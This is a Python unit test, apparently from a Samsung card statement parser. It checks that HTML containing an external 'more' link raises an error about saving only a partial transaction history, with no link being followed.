    def test_samsung_external_more_link_is_not_followed(self):
        content = '<div>소계 <em>2건</em></div><article><span>26.9.8</span><strong>가상 카페</strong><span>5,000원</span></article><a href="https://example.com/payment">더보기</a>'
        with self.assertRaisesRegex(ValueError, "일부 내역만 저장"):
            unlock_statement(self.list_fixture(content), "fixture-only")
